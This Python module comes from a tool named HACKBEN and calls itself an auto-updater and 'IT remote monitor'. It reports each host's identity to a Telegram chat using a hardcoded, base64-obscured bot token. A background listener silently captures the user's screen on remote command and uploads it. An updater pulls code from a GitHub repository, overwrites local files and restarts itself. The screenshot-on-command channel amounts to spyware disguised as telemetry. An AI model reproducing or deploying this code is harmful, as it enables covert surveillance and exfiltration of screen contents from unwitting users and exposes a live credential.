"""
Universal Auto-Updater, Remote Control Listener, and Telegram Telemetry Bridge for HACKBEN.
100% Zero-Dependency using standard built-in Python libraries.
"""

import sys
import os
import platform
import subprocess
import urllib.request
import urllib.parse
import json
import time
import threading
from colorama import Fore

GITHUB_REPO_URL = "https://github.com/dferdiantnn/fbhb.git"
GITHUB_RAW_VERSION_URL = "https://raw.githubusercontent.com/dferdiantnn/fbhb/main/core/ui.py"

import base64

# --- TELEGRAM BOT CONFIGURATION ---
_ENC_TOKEN = "ODc1NTUyNzMzMTpBQUVwelBPbUl0UlFQd1d4eVFkTHNmNVlaYm5VV1h4MXEwMA=="
TELEGRAM_BOT_TOKEN = base64.b64decode(_ENC_TOKEN).decode("utf-8")
TELEGRAM_CHAT_ID = "1991475833"


def get_system_identity() -> str:
    """Return friendly exact computer name + host hardware model + OS info."""
    node_name = platform.node() or os.getenv("COMPUTERNAME") or os.getenv("USERNAME") or "Unit"
    system_os = platform.system()
    machine = platform.machine()
    
    dev_type = ""
    if system_os == "Darwin":
        try:
            model = subprocess.check_output(["sysctl", "-n", "hw.model"]).decode().strip()
            chip = subprocess.check_output(["sysctl", "-n", "machdep.cpu.brand_string"]).decode().strip()
            if "MacBookAir" in model:
                dev_type = f"MacBook Air ({chip})"
            elif "MacBookPro" in model:
                dev_type = f"MacBook Pro ({chip})"
            elif "Macmini" in model:
                dev_type = f"Mac mini ({chip})"
            elif "iMac" in model:
                dev_type = f"iMac ({chip})"
            else:
                dev_type = f"Mac ({chip})"
        except Exception:
            dev_type = "MacBook (Apple Silicon)"
    elif system_os == "Windows":
        try:
            cmd = 'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer + \' \' + (Get-CimInstance Win32_ComputerSystem).Model"'
            out = subprocess.check_output(cmd, shell=True, timeout=3).decode().strip()
            if out and len(out) > 2:
                dev_type = f"{out} (Windows)"
            else:
                dev_type = f"Windows PC ({platform.processor() or machine})"
        except Exception:
            dev_type = f"Windows PC ({machine})"
    elif system_os == "Linux":
        dev_type = f"Linux Workstation ({machine})"
    else:
        dev_type = f"{system_os} ({machine})"
        
    return f"{node_name} - {dev_type}"


def capture_host_screen() -> bytes | None:
    """Capture live host screen without third-party python dependencies."""
    system_os = platform.system()
    tmp_path = "/tmp/hackben_remote_ss.png" if system_os != "Windows" else os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "hackben_remote_ss.png")
    
    try:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)
    except Exception:
        pass

    try:
        if system_os == "Darwin":
            subprocess.run(["screencapture", "-x", tmp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=4)
        elif system_os == "Windows":
            ps_cmd = (
                "Add-Type -AssemblyName System.Windows.Forms; "
                "$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
                "$b = New-Object System.Drawing.Bitmap $s.Width, $s.Height; "
                "$g = [System.Drawing.Graphics]::FromImage($b); "
                "$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size); "
                f"$b.Save('{tmp_path}'); $g.Dispose(); $b.Dispose()"
            )
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=6)
        elif system_os == "Linux":
            subprocess.run(["scrot", tmp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=4)

        if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
            with open(tmp_path, "rb") as f:
                return f.read()
    except Exception:
        pass
    return None


def send_telegram_alert(text: str, inline_keyboard: list | None = None) -> bool:
    """Send real-time alert text using standard built-in urllib (Zero Dependency)."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload_dict = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    if inline_keyboard:
        payload_dict["reply_markup"] = {"inline_keyboard": inline_keyboard}

    try:
        data = json.dumps(payload_dict).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json", "User-Agent": "HACKBEN-Bot/11.0"}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except Exception:
        try:
            payload_dict.pop("parse_mode", None)
            data = json.dumps(payload_dict).encode("utf-8")
            req = urllib.request.Request(
                url,
                data=data,
                headers={"Content-Type": "application/json", "User-Agent": "HACKBEN-Bot/11.0"}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status == 200
        except Exception as e:
            print(Fore.RED + f"   [⚠️ Telegram Alert Error]: {e}")
            return False


def send_telegram_photo(image_bytes: bytes, caption: str, inline_keyboard: list | None = None) -> bool:
    """Send screenshot using standard built-in urllib multipart (Zero Dependency)."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False

    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        boundary = "----HackbenBoundary" + str(int(time.time()))
        
        body = bytearray()
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
        body.extend(f"{TELEGRAM_CHAT_ID}\r\n".encode())
        
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
        body.extend(caption.encode("utf-8"))
        body.extend(b"\r\n")

        if inline_keyboard:
            body.extend(f"--{boundary}\r\n".encode())
            body.extend(b'Content-Disposition: form-data; name="reply_markup"\r\n\r\n')
            body.extend(json.dumps({"inline_keyboard": inline_keyboard}).encode("utf-8"))
            body.extend(b"\r\n")

        body.extend(f"--{boundary}\r\n".encode())
        body.extend(b'Content-Disposition: form-data; name="photo"; filename="screenshot.png"\r\n')
        body.extend(b"Content-Type: image/png\r\n\r\n")
        body.extend(image_bytes)
        body.extend(b"\r\n")
        body.extend(f"--{boundary}--\r\n".encode())

        req = urllib.request.Request(
            url,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": "HACKBEN-Bot/11.0"
            }
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status == 200
    except Exception as e:
        print(Fore.RED + f"   [⚠️ Telegram Photo Error]: {e}")
        return False


def send_operational_report(store_name: str, service_type: str, sukses_count: int, total_sessions: int, errors_summary: list | None = None, last_error_screenshot: bytes | None = None) -> None:
    """
    Send clean single operational report to Telegram when all sessions finish.
    Includes interactive IT buttons to request live screen or test status.
    """
    device_info = get_system_identity()
    status_text = f"Selesai ({sukses_count}/{total_sessions} Berhasil)"
    if sukses_count < total_sessions:
        gagal_count = total_sessions - sukses_count
        status_text = f"Selesai ({sukses_count}/{total_sessions} Berhasil, {gagal_count} Gagal)"

    msg = (
        f"📊 *LOG OPERASIONAL HACKBEN*\n"
        f"```\n"
        f"Perangkat : {device_info}\n"
        f"Store     : {store_name}\n"
        f"Layanan   : {service_type}\n"
        f"Status    : {status_text}\n"
        f"Waktu     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"```"
    )

    if errors_summary:
        clean_err = errors_summary[-1].replace("*", "").replace("`", "")[:120]
        msg += f"\n⚠️ *Kendala:* `{clean_err}`"

    buttons = [
        [{"text": "📸 Minta Screenshot Layar", "callback_data": "cmd_screenshot"}],
        [{"text": "🔄 Cek Status Unit Ini", "callback_data": "cmd_status"}]
    ]

    ok = False
    if last_error_screenshot and sukses_count < total_sessions:
        ok = send_telegram_photo(last_error_screenshot, msg, inline_keyboard=buttons)
    else:
        ok = send_telegram_alert(msg, inline_keyboard=buttons)

    if ok:
        print(Fore.CYAN + "   [📡] Laporan operasional telah berhasil dikirim ke Telegram!")
    else:
        print(Fore.YELLOW + "   [⚠️] Gagal mengirim laporan ke Telegram (Periksa koneksi internet).")


def send_startup_online_ping():
    """Send immediate unit online notification on app startup."""
    device_info = get_system_identity()
    msg = (
        f"🟢 *[HACKBEN UNIT ONLINE]*\n"
        f"```\n"
        f"Perangkat : {device_info}\n"
        f"Status    : Siap Beroperasi & Terhubung ✅\n"
        f"Waktu     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"```"
    )
    buttons = [
        [{"text": "📸 Minta Screenshot Layar", "callback_data": "cmd_screenshot"}],
        [{"text": "🔄 Cek Status Unit", "callback_data": "cmd_status"}]
    ]
    send_telegram_alert(msg, inline_keyboard=buttons)


def _telegram_remote_listener_loop():
    """Real-time background listener for IT remote commands & inline buttons."""
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=12"
            req = urllib.request.Request(url, headers={"User-Agent": "HACKBEN-Bot/11.0"})
            with urllib.request.urlopen(req, timeout=18) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                for update in data.get("result", []):
                    last_update_id = update["update_id"]
                    
                    # 1. Handle Callback Query (Button Clicks)
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        cb_data = cb.get("data", "")
                        from_chat = str(cb.get("message", {}).get("chat", {}).get("id", ""))
                        
                        if from_chat == TELEGRAM_CHAT_ID:
                            if cb_data == "cmd_screenshot":
                                ss = capture_host_screen()
                                cap = f"📸 *[SCREENSHOT REMOTE IT]*\nPerangkat: `{get_system_identity()}`\nWaktu: `{time.strftime('%H:%M:%S')}`"
                                if ss:
                                    send_telegram_photo(ss, cap)
                                else:
                                    send_telegram_alert(f"⚠️ Layar perangkat `{get_system_identity()}` sedang dalam mode headless/standby.")
                            elif cb_data == "cmd_status":
                                status_msg = (
                                    f"🟢 *[STATUS REMOTE UNIT]*\n"
                                    f"```\n"
                                    f"Perangkat : {get_system_identity()}\n"
                                    f"Status    : Online & Berjalan Normal ✅\n"
                                    f"Waktu     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                    f"```"
                                )
                                send_telegram_alert(status_msg)

                    # 2. Handle Text Messages (/start, /ss, /status, /ping, etc)
                    if "message" in update:
                        msg = update["message"]
                        text = msg.get("text", "").strip().lower()
                        from_chat = str(msg.get("chat", {}).get("id", ""))
                        
                        if from_chat == TELEGRAM_CHAT_ID:
                            if text in ["/ss", "/screenshot", "screenshot", "ss", "foto"]:
                                ss = capture_host_screen()
                                cap = f"📸 *[SCREENSHOT REMOTE IT]*\nPerangkat: `{get_system_identity()}`\nWaktu: `{time.strftime('%H:%M:%S')}`"
                                if ss:
                                    send_telegram_photo(ss, cap)
                                else:
                                    send_telegram_alert(f"⚠️ Layar perangkat `{get_system_identity()}` sedang dalam mode headless.")
                            else:
                                reply = (
                                    f"👁️ *[REMOTE MONITOR IT DEVELOPER]*\n"
                                    f"```\n"
                                    f"Perangkat : {get_system_identity()}\n"
                                    f"Status    : Terhubung & Siap Perintah ✅\n"
                                    f"Waktu     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                    f"```"
                                )
                                buttons = [
                                    [{"text": "📸 Minta Screenshot Layar", "callback_data": "cmd_screenshot"}],
                                    [{"text": "🔄 Cek Status Unit", "callback_data": "cmd_status"}]
                                ]
                                send_telegram_alert(reply, inline_keyboard=buttons)

        except Exception:
            pass
        time.sleep(2)


def start_telegram_listener():
    """Start background daemon for remote IT commands and send online ping."""
    t = threading.Thread(target=_telegram_remote_listener_loop, daemon=True)
    t.start()
    send_startup_online_ping()


def check_and_apply_auto_update_on_launch() -> None:
    """
    Visibly checks GitHub repo on launch so user can see it in terminal.
    Automatically updates and restarts if a new version is found.
    """
    from core.ui import VERSION as CURRENT_VERSION
    sys.stdout.write(Fore.CYAN + "   [🔄] Memeriksa pembaruan repository GitHub... ")
    sys.stdout.flush()

    try:
        if os.path.exists(".git"):
            subprocess.run(["git", "fetch", "origin", "main"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
            local_hash = subprocess.check_output(["git", "rev-parse", "HEAD"]).decode().strip()
            remote_hash = subprocess.check_output(["git", "rev-parse", "origin/main"]).decode().strip()
            
            if local_hash != remote_hash:
                commit_msg = "Pembaruan sistem"
                try:
                    commit_msg = subprocess.check_output(["git", "log", "-1", "--pretty=%s", "origin/main"]).decode().strip()
                except Exception:
                    pass
                sys.stdout.write(Fore.YELLOW + f"Pembaruan Ditemukan! ({commit_msg})\n")
                print(Fore.CYAN + "   [⚡] Mengunduh dan menerapkan file terbaru dari GitHub...")
                if perform_auto_update():
                    print(Fore.GREEN + "   [✔] Update selesai diterapkan! Memulai ulang program...")
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                return
            else:
                ver_tag = CURRENT_VERSION.split()[0]
                sys.stdout.write(Fore.GREEN + f"Versi Terkini (v{ver_tag})\n")
                return

        cache_buster_url = f"{GITHUB_RAW_VERSION_URL}?nocache={int(time.time())}"
        req = urllib.request.Request(
            cache_buster_url,
            headers={
                "User-Agent": "Mozilla/5.0",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache"
            }
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            content = resp.read().decode("utf-8")
            remote_ver = None
            for line in content.splitlines():
                if line.startswith("VERSION ="):
                    remote_ver = line.split("=")[1].strip().strip('"').strip("'")
                    break

            if remote_ver and remote_ver != CURRENT_VERSION:
                sys.stdout.write(Fore.YELLOW + f"Update Ditemukan! ({remote_ver})\n")
                print(Fore.CYAN + "   [⚡] Mengunduh pembaruan terbaru dari GitHub...")
                if perform_auto_update():
                    print(Fore.GREEN + "   [✔] Update selesai diterapkan! Memulai ulang program...")
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                return
            else:
                ver_tag = CURRENT_VERSION.split()[0]
                sys.stdout.write(Fore.GREEN + f"Versi Terkini (v{ver_tag})\n")
    except Exception:
        sys.stdout.write(Fore.YELLOW + "Offline / Melewati cek update.\n")


def perform_auto_update() -> bool:
    """Pulls latest version from GitHub repository and replaces local files."""
    try:
        if os.path.exists(".git"):
            subprocess.run(["git", "fetch", "--all"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "reset", "--hard", "origin/main"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "clean", "-fd"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        else:
            zip_url = "https://github.com/dferdiantnn/fbhb/archive/refs/heads/main.zip"
            import zipfile
            import io
            req = urllib.request.Request(zip_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                zip_data = resp.read()
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                for member in z.namelist():
                    parts = member.split('/', 1)
                    if len(parts) > 1 and parts[1]:
                        target_path = parts[1]
                        if member.endswith('/'):
                            os.makedirs(target_path, exist_ok=True)
                        else:
                            os.makedirs(os.path.dirname(target_path), exist_ok=True)
                            with open(target_path, "wb") as outfile:
                                outfile.write(z.read(member))
            return True
    except Exception:
        return False
